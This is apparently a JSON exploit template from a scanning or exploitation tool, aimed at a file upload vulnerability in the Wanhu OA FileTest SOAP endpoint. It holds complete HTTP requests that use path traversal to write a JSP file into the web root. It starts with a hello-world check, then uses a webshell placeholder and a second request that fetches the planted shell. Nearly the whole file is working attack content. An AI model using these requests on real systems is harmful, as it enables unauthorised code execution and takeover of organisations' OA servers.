wanhu/万户OA_FileTest文件上传.json

{  "name":"万户OA_FileTest文件上传",  "tag":"wanhu",  "type":"upload",  "poc": {    "pocGet": "/defaultroot/services/FileTest;1.js",    "pocPost": "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\r\nxmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\r\r\nxmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\r\nxmlns:util=\"http://com.whir.ezoffice.ezform.util.StringUtil\"\r\r\nxmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\r\n<soapenv:Header/>\r\r\n<soapenv:Body>\r\r\n<util:printToFile\r\r\nsoapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\r\n<fileName xsi:type=\"soapenc:string\">../server/oa/deploy/defaultroot.war/public/upload/24k.jsp.</fileName>\r\r\n<content xsi:type=\"soapenc:string\">&#x3c;&#x25;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x6f;&#x75;&#x74;&#x2e;&#x70;&#x72;&#x69;&#x6e;&#x74;&#x28;&#x22;&#x68;&#x65;&#x6c;&#x6c;&#x6f;&#x20;&#x77;&#x6f;&#x72;&#x6c;&#x64;&#x21;&#x22;&#x29;&#x3b;&#x0a;&#x25;&#x3e;</content>\r\r\n</util:printToFile>\r\r\n</soapenv:Body>\r\r\n</soapenv:Envelope>",    "header": {      "Content-Length": "12258",      "Pragma": "no-cache",      "Cache-Control": "no-cache",      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",      "Accept": "*/*",      "Accept-Encoding": "gzip, deflate",      "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,fil;q=0.6",      "Connection": "close",      "SOAPAction": "",      "Content-Type": "text/xml;charset=UTF-8"    },    "status_code":"200",    "pattern": "(encodingStyle)"  },  "exp": {    "step1": {      "expGet": "/defaultroot/services/FileTest;1.js",      "expPost": "<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\r\nxmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\r\r\nxmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\r\nxmlns:util=\"http://com.whir.ezoffice.ezform.util.StringUtil\"\r\r\nxmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\r\n<soapenv:Header/>\r\r\n<soapenv:Body>\r\r\n<util:printToFile\r\r\nsoapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\r\n<fileName xsi:type=\"soapenc:string\">../server/oa/deploy/defaultroot.war/public/upload/24k.jsp.</fileName>\r\r\n<content xsi:type=\"soapenc:string\">{{webshell:HtmlEncode}}</content>\r\r\n</util:printToFile>\r\r\n</soapenv:Body>\r\r\n</soapenv:Envelope>",      "header": {        "Content-Length": "12258",        "Pragma": "no-cache",        "Cache-Control": "no-cache",        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",        "Accept": "*/*",        "Accept-Encoding": "gzip, deflate",        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,fil;q=0.6",        "Connection": "close",        "SOAPAction": "",        "Content-Type": "text/xml;charset=UTF-8"      },      "status_code":"200",      "pattern": "(encodingStyle)"    },    "step2": {      "expGet": "/defaultroot/public/upload/24k.jsp;.js",      "header": {        "cookie": "hades-session-id=cbbce521-a761-403d-b699-9849d2cb06b9;",        "User-Agent": "Mozilla/5.0 (Linux;"      },      "status_code":"200",      "pattern": "()"    }  }}